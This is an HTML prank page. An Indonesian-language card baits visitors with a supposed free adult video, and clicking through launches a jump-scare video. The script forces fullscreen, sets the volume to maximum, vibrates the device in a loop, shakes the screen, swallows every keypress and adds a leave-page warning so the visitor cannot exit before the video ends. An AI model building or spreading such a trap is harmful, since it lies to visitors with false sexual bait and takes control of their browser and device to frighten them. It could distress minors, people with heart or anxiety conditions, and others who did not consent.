  <meta charset="utf-8" />

  <title>Jump Scare Video</title>
  <style>
    body,html {
      margin:0; padding:0;
      height:100%; font-family:sans-serif;
      background:#000; color:#ddd;
      display:flex; justify-content:center; align-items:center;
      text-align:center;
      overflow:hidden;
    }
    .card {
      background:#111; padding:20px; border-radius:12px;
      max-width:500px;
    }
    button {
      margin:10px; padding:12px 20px; border-radius:8px;
      border:none; cursor:pointer; font-size:16px;
    }
    .ok {background:#e11d48; color:#fff;}
    .cancel {background:#333; color:#aaa;}

    /* Overlay */
    #scareOverlay {
      position:fixed; inset:0;
      background:#000; display:none;
      align-items:center; justify-content:center;
      z-index:9999;
    }
    #scareOverlay video {
      width:100%; height:100%;
      object-fit:cover;
    }

    /* Efek goyang */
    .shake {
      animation: shake 0.08s infinite;
    }
    @keyframes shake {
      0% { transform: translate(2px, 2px); }
      25% { transform: translate(-2px, -2px); }
      50% { transform: translate(2px, -2px); }
      75% { transform: translate(-2px, 2px); }
      100% { transform: translate(0, 0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>video free caca 18+</h1>
    <p>jangan di sebar ya ini khusus buat kamu lohhh awww.  
    langsung aja <b>kalau mau liat</b> yang enak enak!</p>
    <button class="ok" id="enterBtn">ya</button>
    <button class="cancel" onclick="alert('Oke batal ðŸ™‚')">tak nak</button>
  </div>

  <div id="scareOverlay">
    <video id="scareVideo" src="scare.mp4" preload="auto"></video>
  </div>

  <script>
    const enterBtn = document.getElementById('enterBtn');
    const overlay = document.getElementById('scareOverlay');
    const video = document.getElementById('scareVideo');

    async function goFullscreen(el) {
      if (el.requestFullscreen) {
        await el.requestFullscreen().catch(()=>{});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
    }

    // cegah keluar dari halaman sebelum video selesai
    window.onbeforeunload = () => "Tunggu sampai video selesai!";
    document.addEventListener("keydown", e => e.preventDefault());

    enterBtn.addEventListener('click', async () => {
      overlay.style.display = 'flex';
      video.currentTime = 0;
      video.volume = 1.0; // ðŸ”Š auto max volume

      await goFullscreen(video);
      video.play().catch(()=>{});

      // vibrasi sinkron loop
      function vibrateLoop() {
        if (!video.paused && !video.ended) {
          navigator.vibrate([200,100,200,100,500]);
          setTimeout(vibrateLoop, 1000);
        } else {
          navigator.vibrate(0);
        }
      }
      vibrateLoop();

      overlay.classList.add("shake");
    });

    video.addEventListener('ended', () => {
      overlay.style.display = 'none';
      overlay.classList.remove("shake");
      navigator.vibrate(0);

      if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();

      window.onbeforeunload = null;
    });
  </script>
